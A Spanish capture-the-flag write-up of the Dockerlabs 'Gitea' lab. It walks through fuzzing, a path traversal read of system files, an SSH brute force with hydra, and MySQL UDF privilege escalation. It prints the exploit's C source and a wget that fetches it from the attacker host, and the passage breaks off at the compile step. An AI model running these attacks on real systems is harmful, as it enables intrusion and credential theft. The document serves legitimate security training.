---
title: Gitea - Medium (Dockerlabs)
permalink: /Gitea-Dockerlabs-Writeup/
tags:
  - "Linux"
  - "Medium"
  - "Subdomain Fuzzing"
  - "Path Traversal"
  - "SSH Brute Force"
  - "UDF"
categories:
  - "writeup"
  - "hacking"
  - "dockerlabs"
  - "hacking web"
toc: true
toc_label: Topics
toc_sticky: true
sidebar:
  - main
  - docs
seo_tittle: Gitea - Medium (Dockerlabs)
seo_description: Pon en práctica explotación de vulnerabilidades web, fuerza bruta y explotación de MySQL para vencer a Gitea.
excerpt: Pon en práctica explotación de vulnerabilidades web, fuerza bruta y explotación de MySQL para vencer a Gitea.
header:
  overlay_image: /assets/images/headers/gitea-dockerlabs.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/gitea-dockerlabs.jpg
---

![image-center](/assets/images/posts/gitea-dockerlabs.png){: .align-center}

**Habilidades:** Virtual Hosting, Subdomain Fuzzing, Directory Path Traversal, SSH Credentials Brute Forcing - `hydra`, Abusing User Defined Functions (UDF) - MySQL [Privilege Escalation]
{: .notice--primary }

# Introducción

Gitea es una máquina Linux de dificultad `Media` de la plataforma de Dockerlabs. El entorno se compone de un servicio web que implementa la herramienta `Gitea`, dentro de esta debemos hacer un análisis de repositorios y explotar vulnerabilidades web para ganar acceso al sistema. Una vez estamos dentro, se nos presenta un escenario donde debemos hacer uso de `User Defined Functions` (UDF) en `mysql` para elevar nuestros privilegios y convertirnos en `root`.

<br>

Antes de comenzar asignaré un nombre de dominio al contenedor y lo contemplaré en el archivo `/etc/hosts` 

~~~ bash
echo '172.17.0.2 gitea.dl' >> /etc/hosts
~~~



# Reconocimiento
---
Enviaremos una traza ICMP a la máquina víctima para verificar que esté activa

~~~ bash
ping -c 1 gitea.dl
~~~


## Nmap 

Haremos un escaneo con el fin de detectar puertos abiertos en la máquina víctima, en este caso, como estamos en un entorno controlado, no hay problema si sacrificamos sigilo para ganar velocidad

~~~ bash
nmap --open -p- --min-rate 5000 -n -sS -v -Pn gitea.dl -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-09 22:08 EDT
Initiating ARP Ping Scan at 22:08
Scanning gitea.dl (172.17.0.2) [1 port]
Completed ARP Ping Scan at 22:08, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 22:08
Scanning gitea.dl (172.17.0.2) [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 3000/tcp on 172.17.0.2
Completed SYN Stealth Scan at 22:08, 1.10s elapsed (65535 total ports)
Nmap scan report for gitea.dl (172.17.0.2)
Host is up (0.000011s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.37 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grep`
- `-v`: Mostrar la información en tiempo real

Haremos un segundo escaneo más exhaustivo frente a los puertos detectados con el propósito de analizar la versión y el servicio que se está ejecutando

~~~ bash
nmap -p 22,80,3000 -sVC gitea.dl -oN services 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-09 22:09 EDT
Nmap scan report for gitea.dl (172.17.0.2)
Host is up (0.000042s latency).
rDNS record for 172.17.0.2: gitea.dl

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e5:9a:b5:5e:a7:fc:3b:2f:7e:62:dd:51:61:f5:aa:2e (ECDSA)
|_  256 8e:ff:03:d7:9b:72:10:c9:72:03:4d:b8:bb:77:e9:b2 (ED25519)
80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: My Login Page
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=67d75bfe6112ce2d; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=lhbuyDso5R7bCAb78Oc-TK523iI6MTc0MTU3MjU3MjQzMzU2NzgwNg; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 10 Mar 2025 02:09:32 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" data-theme="gitea-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2FkbWluLnMzY3IzdGRpci5kZXYuZ2l0ZWEuZGwvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9hZG1pbi5zM2NyM3RkaXIuZGV2LmdpdGVhLmRsL2Fzc2V0cy9pbWcvbG9nby5wbm
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=66e08f247587ba26; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=lKI5D2fMDp8j0VBtfeHeQs4hX7Q6MTc0MTU3MjU3NzQ1NzA4MDQ0OQ; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 10 Mar 2025 02:09:37 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.94SVN%I=7%D=3/9%Time=67CE49DC%P=x86_64-pc-linux-gnu%r(
SF:GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x2
SF:0text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad
SF:\x20Request")%r(GetRequest,1000,"HTTP/1\.0\x20200\x20OK\r\nCache-Contro
SF:l:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nCon
SF:tent-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_gite
SF:a=67d75bfe6112ce2d;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cook
SF:ie:\x20_csrf=lhbuyDso5R7bCAb78Oc-TK523iI6MTc0MTU3MjU3MjQzMzU2NzgwNg;\x2
SF:0Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Opti
SF:ons:\x20SAMEORIGIN\r\nDate:\x20Mon,\x2010\x20Mar\x202025\x2002:09:32\x2
SF:0GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20data-theme=\
SF:"gitea-auto\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"width
SF:=device-width,\x20initial-scale=1\">\n\t<title>Gitea:\x20Git\x20with\x2
SF:0a\x20cup\x20of\x20tea</title>\n\t<link\x20rel=\"manifest\"\x20href=\"d
SF:ata:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9
SF:mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3
SF:RhcnRfdXJsIjoiaHR0cDovL2FkbWluLnMzY3IzdGRpci5kZXYuZ2l0ZWEuZGwvIiwiaWNvb
SF:nMiOlt7InNyYyI6Imh0dHA6Ly9hZG1pbi5zM2NyM3RkaXIuZGV2LmdpdGVhLmRsL2Fzc2V0
SF:cy9pbWcvbG9nby5wbm")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nC
SF:ontent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\
SF:n\r\n400\x20Bad\x20Request")%r(HTTPOptions,197,"HTTP/1\.0\x20405\x20Met
SF:hod\x20Not\x20Allowed\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-Contr
SF:ol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nSe
SF:t-Cookie:\x20i_like_gitea=66e08f247587ba26;\x20Path=/;\x20HttpOnly;\x20
SF:SameSite=Lax\r\nSet-Cookie:\x20_csrf=lKI5D2fMDp8j0VBtfeHeQs4hX7Q6MTc0MT
SF:U3MjU3NzQ1NzA4MDQ0OQ;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20Same
SF:Site=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Mon,\x2010\x20Ma
SF:r\x202025\x2002:09:37\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRe
SF:quest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/p
SF:lain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Req
SF:uest");
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.97 seconds
~~~

- `-p`: Especificar los puertos
- `-sV`: Identificar la versión del servicio que se ejecuta
- `-sC`: Uso de scripts de reconocimiento 
- `-oN`: Exportar en formato normal (tal como se ve por consola)


## Web Analysis

Como se encuentra activo un servicio `http`, analizaremos las tecnologías que se ejecutan en el puerto `80`

~~~ bash
whatweb http://gitea.dl                                                                                                                        
http://gitea.dl [200 OK] Apache[2.4.58], Bootstrap[4.3.1], Country[RESERVED][ZZ], Email[admin@gitea.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.2], JQuery, Meta-Author[Kodinger], PasswordField[password], Script, Title[My Login Page]
~~~

Vemos una dirección de correo electrónico asociado al usuario `admin`. En la web vemos una página de inicio de sesión

![image-center](/assets/images/posts/gitea-web-analysis.png){: .align-center}

En el `placeholder` de los campos a rellenar podemos ver ciertos textos que no son comunes. Vamos a probar iniciar sesión con estas palabras, sin embargo no podremos

Si analizamos el servicio HTTP que se ejecuta en el puerto `3000`, podemos ver que se trata de `gitea`

~~~ bash
whatweb http://gitea.dl:3000                                                                                                                   
http://gitea.dl:3000 [200 OK] Cookies[_csrf,i_like_gitea], Country[RESERVED][ZZ], HTML5, HttpOnly[_csrf,i_like_gitea], IP[172.17.0.2], Meta-Author[Gitea - Git with a cup of tea], Open-Graph-Protocol[website], PoweredBy[Gitea], Script, Title[Gitea: Git with a cup of tea], X-Frame-Options[SAMEORIGIN]
~~~

![image-center](/assets/images/posts/gitea-gitea.png){: .align-center}

Si nos vamos al inicio de sesión (`http://gitea.dl:3000/user/login?redirect_to=%2f`) vemos el siguiente mensaje

![image-center](/assets/images/posts/gitea-login.png){: .align-center}


## Virtual Hosting

Se nos dice que la URL que estamos visitando no coincide con la ruta definida en el archivo `app.ini`. Como se está aplicando `Virtual Hosting`, agregaremos este dominio a `/etc/hosts`

~~~ bash
cat /etc/hosts | grep gitea.dl

172.17.0.2 gitea.dl admin.s3cr3tdir.dev.gitea.dl
~~~

Si visitamos la nueva URL podremos registrarnos con una cuenta, en mi caso he creado una cuenta con un usuario `incommatose`

Dentro de `gitea` con nuestra sesión iniciada haremos clic en `Explore` para ver repositorios existentes. Lograremos ver tres concretamente

![image-center](/assets/images/posts/gitea-gitea-repos.png){: .align-center}

## `mysql` Repository Analysis

Si vemos el archivo `docker-compose.yml` del repositorio `mysql`, vemos supuestamente las credenciales del usuario `root` y del usuario `designer` para `mysql`

![image-center](/assets/images/posts/gitea-repo-mysql.png){: .align-center}


## `app` Repository Analysis

Dentro del repositorio `app` se encuentra lo que parece ser el código de la página que vimos al principio. En el archivo `app.py` notaremos las siguientes funciones

![image-center](/assets/images/posts/gitea-repo-app.png){: .align-center}

Tenemos la ruta `/download` que al parecer acepta un método GET, que haciendo uso de un parámetro `filename` podemos incluir archivos de la máquina


## Subdomain Fuzzing (Alternative)

Buscaremos subdominios para `gitea.dl` enviando cada línea de un diccionario en una cabecera HTTP que haga referencia a un host

~~~ bash
wfuzz -c --hl 315 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.gitea.dl' http://gitea.dl 

Check Wfuzz\'s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://gitea.dl/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000019:   200        5504 L   16887 W    265382 Ch   "dev"    

Total time: 0
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 0
~~~


## `dev.gitea.dl` Subdomain

Hemos encontrado un subdominio `dev.gitea.dl`, lo contemplaremos en el archivo `/etc/hosts` y navegaremos hasta él

~~~ bash
cat /etc/hosts | grep gitea

172.17.0.2 gitea.dl dev.gitea.dl 
~~~

![image-center](/assets/images/posts/gitea-dev-subdomain-web.png){: .align-center}


## Directory Fuzzing

Investigando la web no encontraremos nada interesante, entonces lo haremos a la fuerza empleando `fuzzing`

~~~ bash
wfuzz -c --hc 404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://dev.gitea.dl/FUZZ

Check Wfuzz\'s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://dev.gitea.dl/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload         
=====================================================================
000000027:   301        9 L      28 W       313 Ch      "search"
000000291:   301        9 L      28 W       313 Ch      "assets"
000000783:   301        9 L      28 W       310 Ch      "src"        
000001073:   301        9 L      28 W       317 Ch      "javascript" 
~~~

Existen tres rutas accesibles en este subdominio, `search`, `assets`, `src` y `javascript`. Visitaremos `search` primeramente (porque es la única en la que encontraremos información relevante)

![image-center](/assets/images/posts/gitea-search-s3cr3tdir.png){: .align-center}

No vemos más que la palabra `s3cr3tdir`, luego de validar que sea parte de un directorio en los subdominios nos daremos cuenta que forma parte del subdominio que ya tenemos contemplado XD. Ahora contemplaremos este subdominio en el `/etc/hosts` para ir avanzando

~~~ bash
cat /etc/hosts | grep gitea

172.17.0.2 gitea.dl dev.gitea.dl s3cr3tdir.dev.gitea.dl
~~~

Si visitamos el dominio en el navegador podemos ver una página web

![image-center](/assets/images/posts/gitea-s3cr3tdir.png){: .align-center}

Haremos nuevamente fuzzing para ver si existen más subdominios existentes bajo `s3cr3tdir.dev.gitea.dl`

~~~ bash
wfuzz -c --hl 315 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.s3cr3tdir.dev.gitea.dl' http://s3cr3tdir.dev.gitea.dl
Check Wfuzz\'s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://s3cr3tdir.dev.gitea.dl/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000000024:   200        248 L    1280 W     13819 Ch    "admin" 
~~~

Descubrimos un nuevo subdominio `admin.s3cr3tdir.dev.gitea.dl`, que casualmente resulta ser el que contemplamos en un principio. Lo contemplaremos en el archivo `/etc/hosts` si decidimos explorar esta forma de descubrir el dominio final

~~~ bash
cat /etc/hosts | grep gitea

172.17.0.2 gitea.dl admin.s3cr3tdir.dev.gitea.dl dev.gitea.dl s3cr3tdir.dev.gitea.dl
~~~


# Explotación
---
## Directory Path Traversal 

Recordemos que en el repositorio `app` se define una función que espera un parámetro `filename` por GET en la ruta `http://gitea.dl/downloads`

![image-center](/assets/images/posts/gitea-path-traversal.png){: .align-center}

En este caso es más cómodo usar `curl` porque desde el navegador te descarga el archivo directamente y no me interesa ese archivo en mi sistema

~~~ bash
curl -s "http://gitea.dl/download?filename=../../../../../etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
designer:x:1001:1001::/home/designer:/bin/bash
_galera:x:100:65534::/nonexistent:/usr/sbin/nologin
mysql:x:101:103:MariaDB Server,,,:/nonexistent:/bin/false
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
~~~

Si somos observadores podremos notar que en el repositorio `giteaInfo`, concretamente en el archivo (y único) `gitea-composed.yml`. Se definen rutas con un archivo `info.txt`

![image-center](/assets/images/posts/gitea-giteaInfo-repo.png){: .align-center}

Luego de algunas pruebas con rutas logré encontrar el archivo en cuestión en el directorio `/opt`

~~~ bash
curl -s "http://gitea.dl/download?filename=../../../../../../../opt/info.txt" | head 
user001:Passw0rd!23 - Juan abrió su laptop y suspiró. Hoy era el día en que finalmente accedería a la base de datos.
user002:Qwerty@567 - Marta había elegido su contraseña basándose en su teclado, una decisión que lamentaría más tarde.
user003:Secure#Pass1 - Cuando Miguel configuró su clave, pensó que era invulnerable. No sabía lo que le esperaba.
user004:H4ckM3Plz! - Los foros de hackers estaban llenos de desafíos, y Pedro decidió probar con una cuenta de prueba.
user005:Random*Key9 - Sofía tenía la costumbre de escribir sus contraseñas en post-its, hasta que un día desaparecieron.
user006:UltraSafe99$ - "Esta vez seré más cuidadoso", se prometió Andrés mientras ingresaba su nueva clave.
user007:TopSecret!! - Lucía nunca compartía su contraseña, ni siquiera con sus amigos más cercanos.
user008:MyP@ssw0rd22 - Julián pensó que usar números en lugar de letras lo haría más seguro. Se equivocó.
user009:S3cur3MePls# - La empresa exigía contraseñas seguras, pero Carlos siempre encontraba una forma de simplificarlas.
user010:Admin123! - Un ataque de fuerza bruta reveló que la cuenta del administrador tenía una clave predecible.
~~~

Parece ser que todas estas son posibles contraseñas para algún usuario, como sabemos que solo existe `designer` y no `admin` en la máquina, probablemente sean de éste usuario en concreto

Dado que son muchas posibles contraseña, podemos extraer rápidamente esta información con el siguiente comando **(importante aplicar espacios en el parámetro `-F` de `awk`, de lo contrario nos dejará las contraseñas con un espacio al final, sino agregar `| tr -d ' '` al final del comando de forma alternativa)**

~~~ bash
curl "http://gitea.dl/download?filename=../../../../../../../opt/info.txt" -sL | awk -F ' - ' '{print $1}' | awk -F ':' '{print $2}' > passes.txt
~~~


## SSH Credentials Brute Forcing

Como sabemos que `designer` es un usuario a nivel de sistema, usaremos este listado de contraseñas que hemos generado para hacer fuerza bruta contra este usuario 

~~~ bash
hydra -l designer -P passes.txt ssh://gitea.dl        
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-09 23:56:52
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 50 login tries (l:1/p:50), ~4 tries per task
[DATA] attacking ssh://gitea.dl:22/
[22][ssh] host: gitea.dl   login: designer   password: SuperSecurePassword123
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
~~~

Y obtenemos la contraseña válida para el usuario `designer` a nivel de `ssh`, ahora podemos conectarnos a la máquina por el protocolo mencionado

~~~ bash
ssh designer@gitea.dl 
The authenticity of host 'gitea.dl (172.17.0.2)' can't be established.
ED25519 key fingerprint is SHA256:3MWzrJcA29hpN9anKC1La+CtTHNbWf4M38GIFWtYFIo.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:1: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'gitea.dl' (ED25519) to the list of known hosts.
designer@gitea.dl's password: 
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.10.11-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Mon Mar 10 04:53:09 2025 from 172.17.0.1
designer@0749e50021a5:~$ 
~~~



# Escalada de privilegios
---
Asignaremos el valor `xterm` a la variable de entorno `TERM` para poder hacer `Ctrl + L`

~~~ bash
designer@0749e50021a5:~$ export TERM=xterm
~~~


## MySQL Analysis

Listando puertos que puedan estar abiertos internamente, podemos ver que el puerto `3306`, que suele ser `mysql` es accesible internamente

~~~ bash
ss -tunl
Netid             State              Recv-Q             Send-Q                           Local Address:Port                           Peer Address:Port
tcp               LISTEN             0                  511                                    0.0.0.0:80                                  0.0.0.0:*
tcp               LISTEN             0                  128                                    0.0.0.0:22                                  0.0.0.0:*
tcp               LISTEN             0                  80                                   127.0.0.1:3306                                0.0.0.0:*
tcp               LISTEN             0                  4096                                         *:3000                                      *:*       
tcp               LISTEN             0                  128                                       [::]:22                                     [::]:*
~~~

También podemos ver la ruta donde `mysql` está instalado con el comando `which`

~~~ bash
which mysql
~~~


### MySQL Banner Grabbing

De forma alternativa podemos hacer `SSH Port Forwarding` para que este puerto sea accesible desde nuestra máquina atacante y así hacer un análisis más exhaustivo del servicio

~~~ bash
ssh -L 3306:127.0.0.1:3306 designer@gitea.dl
designer@gitea.dl's password: 
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.10.11-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Mon Mar 10 05:33:18 2025 from 172.17.0.1
designer@0749e50021a5:~$ 
~~~

Ahora podemos analizar el servicio con `nmap` para obtener información (toda información es útil de alguna forma)

~~~ bash
nmap -p 3306 -sVC localhost
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-10 02:17 EDT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000075s latency).

PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.5.5-10.11.8-MariaDB-0ubuntu0.24.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.11.8-MariaDB-0ubuntu0.24.04.1
|   Thread ID: 37
|   Capabilities flags: 63486
|   Some Capabilities: FoundRows, Support41Auth, Speaks41ProtocolOld, SupportsLoadDataLocal, ConnectWithDatabase, SupportsTransactions, IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, Speaks41ProtocolNew, InteractiveClient, LongColumnFlag, SupportsCompression, DontAllowDatabaseTableColumn, ODBCClient, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: 2uvs\ToT4FEdJ$q2C;;U
|_  Auth Plugin Name: mysql_native_password

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.48 seconds
~~~

Intentando todo tipo de credenciales que hemos obtenido (con la del usuario `designer` obvio), recordé la primera pista que nos dieron al entrar en el primer inicio de sesión. Las credenciales `admin`:`PassAdmin123-` que aparecían en el `placeholder` de los campos en la página, son válidas para acceder al servicio de `mysql`

~~~ bash
designer@0749e50021a5:~$ mysql -u admin -p'PassAdmin123-'
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 20
Server version: 10.11.8-MariaDB-0ubuntu0.24.04.1 Ubuntu 24.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
~~~

Había una base de datos pero como en este momento no recuerdo el nombre te muestro como podemos ejecutar un comando a nivel de sistema en la shell de `mysql`

~~~ bash
MariaDB [mysql]> system find / -name "gitea.db" 2>/dev/null
/home/designer/gitea/data/gitea.db
~~~


## User Defined Functions (UDF)

Usaremos esta técnica para escalar privilegios que consiste en cargar una librería compartida maliciosa con el fin de ejecutar código externo y definido por nosotros a nivel de sistema

- https://www.exploit-db.com/exploits/1518

~~~ sql
MariaDB [mysql]> SHOW VARIABLES LIKE '%plugin_dir%';
+---------------+------------------------+
| Variable_name | Value                  |
+---------------+------------------------+
| plugin_dir    | /usr/lib/mysql/plugin/ |
+---------------+------------------------+
1 row in set (0.001 sec)

SHOW VARIABLES LIKE '%secure_file_priv%';
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+
1 row in set (0.001 sec)
~~~

Con esta información sabemos que podemos guardar `plugins` dentro de `/usr/lib/mysql/plugins`. Debemos comprobar que tengamos permisos de escritura sobre este directorio como el usuario actual

~~~ bash
designer@0749e50021a5:~/gitea/data$ ls -l /usr/lib/mysql/
total 0
drwxr-xrwx 1 root root 866 Feb 26 12:13 plugin
~~~

Tenemos permisos casi absolutos, por lo que podremos traer librerías dentro de este directorio. Existe un exploit en `exploitdb` que podemos usar en este caso (aunque se especifique que la versión no está en el alcance)

~~~ bash
searchsploit mysql 5 | grep UDF
MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2) | linux/local/1518.c

# Importaremos este exploit
searchsploit -m linux/local/1518.c
  Exploit: MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)
      URL: https://www.exploit-db.com/exploits/1518
     Path: /usr/share/exploitdb/exploits/linux/local/1518.c
    Codes: N/A
 Verified: True
File Type: C source, ASCII text
Copied to: /home/incommatose/machines/dockerlabs/gitea/nmap/1518.c
~~~

Si analizamos el código podremos ver el funcionamiento del `exploit`, pero primero cambiemos su nombre para que sea más intuitivo

~~~ bash
mv 1518.c exploit_udf.c 
~~~

> `exploit_udf.c`

~~~ c
#include <stdio.h>
#include <stdlib.h>

enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};

typedef struct st_udf_args {
	unsigned int		arg_count;	// number of arguments
	enum Item_result	*arg_type;	// pointer to item_result
	char 			**args;		// pointer to arguments
	unsigned long		*lengths;	// length of string args
	char			*maybe_null;	// 1 for maybe_null args
} UDF_ARGS;

typedef struct st_udf_init {
	char			maybe_null;	// 1 if func can return NULL
	unsigned int		decimals;	// for real functions
	unsigned long 		max_length;	// for string functions
	char			*ptr;		// free ptr for func data
	char			const_item;	// 0 if result is constant
} UDF_INIT;

int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
{
	if (args->arg_count != 1)
		return(0);

	system(args->args[0]);

	return(0);
}

char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
{
	return(0);
}
~~~

- La función `do_system` será la encargada de ejecutar el comando que enviemos como argumento
- Dentro de esta función se hace un llamado a `system()`, que intenta ejecutar en el sistema la cadena que enviamos

Como ya lo tengo en mi máquina atacante, podemos directamente compartirlo en la red y descargarlo en la máquina víctima

~~~ bash
designer@0749e50021a5:/tmp$ wget http://172.17.0.1/exploit_udf.c
--2025-03-10 06:26:28--  http://172.17.0.1/exploit_udf.c
Connecting to 172.17.0.1:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3281 (3.2K) [text/x-csrc]
Saving to: ‘exploit_udf.c’

exploit_udf.c                                 100%[=================================================================================================>]   3.20K  --.-KB/s    in 0s      

2025-03-10 06:26:28 (212 MB/s) - ‘exploit_udf.c’ saved [3281/3281]
~~~


### Compiling Exploit

Ahora procedemos a compilar este código en C para convertirlo en una librería dinámica y cargarlo en `mysql`

~~~ bash
